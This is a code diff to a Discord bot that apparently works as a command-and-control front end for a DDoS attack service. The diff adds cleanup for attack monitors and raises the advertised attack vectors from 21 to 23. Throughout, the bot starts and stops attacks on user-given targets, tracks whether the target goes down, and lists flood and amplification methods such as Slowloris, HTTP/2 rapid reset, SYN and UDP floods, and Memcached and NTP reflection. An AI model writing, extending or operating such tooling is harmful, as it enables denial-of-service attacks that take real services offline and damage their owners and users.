@@ -422,7 +422,7 @@ function startMonitor(attackId: number, editFn: MonitorEditFn, target: string, u
         botClient &&
         !downAlertSent.get(attackId) &&
         !probe.up &&
-        (probe.reason?.includes("refused") || probe.reason?.includes("DNS") || probe.reason?.includes("ENOTFOUND") || probe.reason?.includes("ECONNREFUSED"))
+        (probe.reason?.includes("refused") || probe.reason?.includes("ECONNREFUSED"))
       ) {
         downAlertSent.set(attackId, true);
         try {
@@ -560,6 +560,15 @@ async function handleAttackStart(interaction: ChatInputCommandInteraction): Prom
   });
 }
 
+function cleanupMonitor(id: number): void {
+  const timer = monitors.get(id);
+  if (timer) clearInterval(timer);
+  monitors.delete(id);
+  prevPackets.delete(id);
+  targetHistories.delete(id);
+  downAlertSent.delete(id);
+}
+
 async function handleAttackStop(interaction: ChatInputCommandInteraction): Promise<void> {
   await interaction.deferReply();
   const id = interaction.options.getInteger("id", true);
@@ -567,8 +576,7 @@ async function handleAttackStop(interaction: ChatInputCommandInteraction): Promi
   try {
     const result = await api.stopAttack(id);
     const ok     = result?.ok ?? false;
-    const timer  = monitors.get(id);
-    if (timer) { clearInterval(timer); monitors.delete(id); }
+    cleanupMonitor(id);
     await interaction.editReply({ embeds: [buildStopEmbed(id, ok)] });
     console.log(`[ATTACK #${id}] ${ok ? "Stopped" : "Stop failed"}`);
   } catch {
@@ -750,7 +758,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
               { name: "⏱ Duration",        value: `**${duration}s**`,        inline: true },
               { name: "🧵 Threads/Node",   value: `**${threads}**`,          inline: true },
               { name: "🌐 Nodes Online",   value: `**${nodesOnline}**`,      inline: true },
-              { name: "⚡ Total Vectors",  value: `**${nodesOnline * 21}** simultaneous`, inline: true },
+              { name: "⚡ Total Vectors",  value: `**${nodesOnline * 23}** simultaneous`, inline: true },
               { name: "📊 Status",         value: "🔴 **ALL NODES INITIALIZING...**", inline: true },
             )
             .setFooter({ text: AUTHOR })
@@ -786,16 +794,16 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
         .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
         .setDescription(
           `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
-          `👁️ **GEASS OVERRIDE ∞ — ARES OMNIVECT** — **21** simultaneous real attack vectors against \`${target}\`\n\n` +
+          `👁️ **GEASS OVERRIDE ∞ — ARES OMNIVECT** — **23** simultaneous real attack vectors against \`${target}\`\n\n` +
           `**L7 (11):** ConnFlood → Slowloris → H2RST(CVE-2023) → H2CONT(CVE-2024) → HPACK Bomb → WAF Bypass → WebSocket → GraphQL → RUDY v2 → Cache Poison → H2 Storm\n` +
-          `**Pipeline+TLS+UDP (5):** HTTP Pipeline(300K/s) → TLS Renego → QUIC/H3 → SSL Death → UDP Flood\n` +
+          `**Pipeline+TLS+UDP (7):** HTTP Pipeline(300K/s) → TLS Renego → QUIC/H3 → SSL Death → UDP Flood → HTTP Bypass → SYN Flood\n` +
           `**L3 (5):** ICMP Flood → DNS Water Torture → NTP Flood → Memcached → SSDP M-SEARCH`
         )
         .addFields(
           { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
           { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
           { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
-          { name: "📊 Status",   value: "🔴 **INITIALIZING 21 VECTORS — ARES OMNIVECT COMMAND...**", inline: false },
+          { name: "📊 Status",   value: "🔴 **INITIALIZING 23 VECTORS — ARES OMNIVECT COMMAND...**", inline: false },
         )
         .setFooter({ text: AUTHOR })
         .setTimestamp()
@@ -923,8 +931,7 @@ async function handleButton(interaction: import("discord.js").ButtonInteraction)
     try {
       const result = await api.stopAttack(id);
       const ok     = result?.ok ?? false;
-      const timer  = monitors.get(id);
-      if (timer) { clearInterval(timer); monitors.delete(id); }
+      cleanupMonitor(id);
       await interaction.editReply({ embeds: [buildStopEmbed(id, ok)] });
       console.log(`[BUTTON] ${interaction.user.tag} stopped attack #${id}`);
     } catch {
